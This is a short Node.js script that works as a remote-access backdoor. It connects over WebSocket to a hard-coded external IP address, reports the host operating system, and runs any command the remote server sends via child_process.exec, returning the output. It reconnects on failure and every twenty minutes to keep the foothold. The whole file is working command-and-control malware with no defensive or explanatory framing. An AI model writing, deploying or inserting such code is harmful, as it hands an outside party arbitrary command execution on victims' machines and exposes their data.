const WS = require('ws')
const os = require('os');
const { exec } = require('child_process')
let ws = new WS("ws://20.115.225.169:8080")
let connected = 0

function connect() {
    connected+=1
    ws = new WS("ws://20.115.225.169:8080")
    ws.on("open", () => {
        console.log("Connection establised")
        if (connected < 2){
            ws.send(`Connected to OS :: ${os.type()}`)
        }
        ws.on("message", (message) => {
            const msg = message.toString()
            const [client, operation, ...text] = msg.split(" ")
            if (operation === "$exec") { // checks if there is exec command to execute the cmd.
                cmd(text.join(" "))
            }
        })
    })
    ws.on("error", (error) => {
        console.log("error")
        setTimeout(reconnect, 2000)
    })
    ws.on("close", () => {
        console.log("Connection Closed")
    })

}

function cmd(cmd) {
    try {
        exec(cmd, (err, stdout, stderr) => {
            if (err) {
                ws.send(`ERORR ::: ${err}`)
                return
            } else if (stderr) {
                ws.send(`STDERR ::: ${stderr}`)
                return
            }
            ws.send(stdout)
        })
    } catch {
        console.log(`Something Went Wrong with exec cmd.`)
    }
}

function reconnect() {
    try{
        ws.close()
        connect()
    } catch{
        console.log("Some Error in reconnection")
    }
}
reconnect()
setInterval(reconnect, 1000*60*20)

